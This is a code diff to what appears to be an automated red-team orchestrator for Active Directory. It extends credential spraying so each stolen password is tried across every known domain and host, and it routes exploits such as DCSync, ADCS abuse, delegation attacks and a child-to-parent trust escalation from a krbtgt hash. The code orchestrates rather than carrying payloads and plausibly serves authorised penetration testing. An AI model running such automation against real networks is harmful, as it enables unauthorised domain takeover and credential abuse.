@@ -84,6 +84,35 @@ def _has_admin_access(state: SharedRedTeamState, host: Host) -> bool:
     return False
 
 
+def _collect_candidate_domains(state: SharedRedTeamState) -> set[str]:
+    domains: set[str] = set()
+    if state.target and state.target.domain:
+        domains.add(state.target.domain)
+    for cred in state.all_credentials:
+        if cred.domain:
+            domains.add(cred.domain)
+    for user in state.all_users:
+        if user.domain:
+            domains.add(user.domain)
+    return domains
+
+
+def _select_domain_credential(state: SharedRedTeamState, domain: str) -> Credential | None:
+    admin_first = [c for c in state.all_credentials if c.domain == domain and c.password]
+    for cred in admin_first:
+        if cred.is_admin:
+            return cred
+    return admin_first[0] if admin_first else None
+
+
+def _is_child_domain(child_domain: str, parent_domain: str) -> bool:
+    if not child_domain or not parent_domain:
+        return False
+    if child_domain == parent_domain:
+        return False
+    return child_domain.endswith(f".{parent_domain}")
+
+
 async def credential_expansion_loop(
     dispatcher: RedTeamDispatcher,
     max_iterations: int = 10,
@@ -109,6 +138,8 @@ async def credential_expansion_loop(
         CredentialTestingTracker with test results
     """
     tracker = CredentialTestingTracker()
+    from ares.core.models import Credential as RuntimeCredential
+
     iterations = 0
 
     logger.info("Starting credential expansion loop")
@@ -118,6 +149,7 @@ async def credential_expansion_loop(
 
         credentials = state.all_credentials
         hosts = state.all_hosts
+        candidate_domains = _collect_candidate_domains(state)
         new_tests = 0
         tasks_dispatched: list[str] = []
 
@@ -126,35 +158,52 @@ async def credential_expansion_loop(
         )
 
         for cred in credentials:
+            domain_variants = {cred.domain} if cred.domain else set()
+            if cred.password:
+                domain_variants.update(candidate_domains)
+            domain_variants = {d for d in domain_variants if d}
+
             for host in hosts:
-                if tracker.has_tested(cred, host):
-                    continue
-
-                # Skip if we already have admin access on this host
-                if _has_admin_access(state, host):
-                    tracker.mark_tested(cred, host, success=True)
-                    continue
-
-                # Dispatch lateral movement test
-                task_id = await dispatcher.request_lateral_movement(
-                    target_host=host.ip,
-                    username=cred.username,
-                    source_agent="orchestrator",
-                    password=cred.password if cred.password else None,
-                    domain=cred.domain,
-                )
-
-                if task_id:
-                    tasks_dispatched.append(task_id)
-                    new_tests += 1
-                    logger.debug(
-                        f"Dispatched lateral test: {cred.domain}\\{cred.username} -> {host.ip}"
+                for domain_override in domain_variants:
+                    test_cred = RuntimeCredential(
+                        username=cred.username,
+                        password=cred.password,
+                        domain=domain_override,
+                        source=cred.source,
+                        is_admin=cred.is_admin,
                     )
 
-                tracker.mark_tested(cred, host)
+                    if tracker.has_tested(test_cred, host):
+                        continue
 
-                # Small delay to avoid overwhelming
-                await asyncio.sleep(delay_between_tests)
+                    # Skip if we already have admin access on this host
+                    if _has_admin_access(state, host):
+                        tracker.mark_tested(test_cred, host, success=True)
+                        continue
+
+                    # Dispatch lateral movement test
+                    task_id = await dispatcher.request_lateral_movement(
+                        target_host=host.ip,
+                        username=cred.username,
+                        source_agent="orchestrator",
+                        password=cred.password if cred.password else None,
+                        domain=domain_override,
+                    )
+
+                    if task_id:
+                        tasks_dispatched.append(task_id)
+                        new_tests += 1
+                        logger.debug(
+                            "Dispatched lateral test: %s\\%s -> %s",
+                            domain_override,
+                            cred.username,
+                            host.ip,
+                        )
+
+                    tracker.mark_tested(test_cred, host)
+
+                    # Small delay to avoid overwhelming
+                    await asyncio.sleep(delay_between_tests)
 
         if new_tests == 0:
             logger.info("No new credential/host combinations to test")
@@ -284,6 +333,75 @@ async def exploitation_workflow(
     }
 
 
+async def _dispatch_exploit(
+    dispatcher: RedTeamDispatcher,
+    vuln_type: str,
+    vuln_id: str,
+    target: str,
+    details: dict[str, Any],
+) -> str:
+    return await dispatcher.request_exploit(
+        vuln_type=vuln_type,
+        vuln_id=vuln_id,
+        target=target,
+        source_agent="orchestrator",
+        params=details,
+    )
+
+
+async def _dispatch_acl(dispatcher: RedTeamDispatcher, details: dict[str, Any]) -> str:
+    return await dispatcher.request_acl_analysis(
+        target_user=details.get("target_user", ""),
+        domain=details.get("domain", ""),
+        source_agent="orchestrator",
+        find_path_to=details.get("find_path_to", "Domain Admins"),
+    )
+
+
+async def _dispatch_krbtgt(
+    dispatcher: RedTeamDispatcher,
+    vuln: dict[str, Any],
+    target: str,
+    details: dict[str, Any],
+) -> str:
+    krbtgt_domain = details.get("domain", "")
+    parent_domain = (
+        dispatcher.shared_state.target.domain
+        if dispatcher.shared_state.target and dispatcher.shared_state.target.domain
+        else ""
+    )
+    if _is_child_domain(krbtgt_domain, parent_domain):
+        credential = _select_domain_credential(dispatcher.shared_state, krbtgt_domain)
+        if credential:
+            task_id = await dispatcher.request_exploit(
+                vuln_type="trust_raise_child",
+                vuln_id=vuln["id"],
+                target=target,
+                source_agent="orchestrator",
+                params={
+                    "child_domain": krbtgt_domain,
+                    "target_domain": parent_domain,
+                    "username": credential.username,
+                    "password": credential.password,
+                },
+            )
+            if task_id:
+                return task_id
+        else:
+            logger.warning(
+                "krbtgt hash found for %s but no credential available for raise_child",
+                krbtgt_domain,
+            )
+
+    return await dispatcher.request_lateral_movement(
+        target_host=target,
+        username="Administrator",
+        source_agent="orchestrator",
+        hash_value=details.get("hash_value", ""),
+        domain=krbtgt_domain,
+    )
+
+
 async def _exploit_vulnerability(
     dispatcher: RedTeamDispatcher,
     vuln: dict[str, Any],
@@ -303,77 +421,30 @@ async def _exploit_vulnerability(
     target = vuln["target"]
     details = vuln.get("details", {})
 
+    async def dispatch_exploit() -> str:
+        return await _dispatch_exploit(dispatcher, vuln_type, vuln["id"], target, details)
+
+    async def dispatch_acl() -> str:
+        return await _dispatch_acl(dispatcher, details)
+
+    async def dispatch_krbtgt() -> str:
+        return await _dispatch_krbtgt(dispatcher, vuln, target, details)
+
+    routes = [
+        (lambda: vuln_type.startswith("ADCS_"), dispatch_exploit),
+        (lambda: vuln_type == "acl_abuse", dispatch_acl),
+        (lambda: "delegation" in vuln_type.lower(), dispatch_exploit),
+        (lambda: vuln_type == "krbtgt_hash", dispatch_krbtgt),
+        (lambda: vuln_type == "dcsync", dispatch_exploit),
+        (lambda: vuln_type.startswith("mssql_"), dispatch_exploit),
+        (lambda: True, dispatch_exploit),
+    ]
+
     task_id = ""
-
-    # Route based on vulnerability type
-    if vuln_type.startswith("ADCS_"):
-        # Route to PrivEsc agent
-        task_id = await dispatcher.request_exploit(
-            vuln_type=vuln_type,
-            vuln_id=vuln["id"],
-            target=target,
-            source_agent="orchestrator",
-            params=details,
-        )
-
-    elif vuln_type == "acl_abuse":
-        # Route to ACL agent
-        task_id = await dispatcher.request_acl_analysis(
-            target_user=details.get("target_user", ""),
-            domain=details.get("domain", ""),
-            source_agent="orchestrator",
-            find_path_to=details.get("find_path_to", "Domain Admins"),
-        )
-
-    elif "delegation" in vuln_type.lower():
-        # Route to PrivEsc agent for delegation attacks
-        task_id = await dispatcher.request_exploit(
-            vuln_type=vuln_type,
-            vuln_id=vuln["id"],
-            target=target,
-            source_agent="orchestrator",
-            params=details,
-        )
-
-    elif vuln_type == "krbtgt_hash":
-        # Golden ticket - route to lateral agent
-        task_id = await dispatcher.request_lateral_movement(
-            target_host=target,
-            username="Administrator",
-            source_agent="orchestrator",
-            hash_value=details.get("hash_value", ""),
-            domain=details.get("domain", ""),
-        )
-
-    elif vuln_type == "dcsync":
-        # DCSync - route to privesc agent
-        task_id = await dispatcher.request_exploit(
-            vuln_type=vuln_type,
-            vuln_id=vuln["id"],
-            target=target,
-            source_agent="orchestrator",
-            params=details,
-        )
-
-    elif vuln_type.startswith("mssql_"):
-        # MSSQL attacks - route to privesc agent
-        task_id = await dispatcher.request_exploit(
-            vuln_type=vuln_type,
-            vuln_id=vuln["id"],
-            target=target,
-            source_agent="orchestrator",
-            params=details,
-        )
-
-    else:
-        # Default: route to privesc agent
-        task_id = await dispatcher.request_exploit(
-            vuln_type=vuln_type,
-            vuln_id=vuln["id"],
-            target=target,
-            source_agent="orchestrator",
-            params=details,
-        )
+    for predicate, handler in routes:
+        if predicate():
+            task_id = await handler()
+            break
 
     if not task_id:
         logger.warning(f"Failed to dispatch exploitation for {vuln_type}")
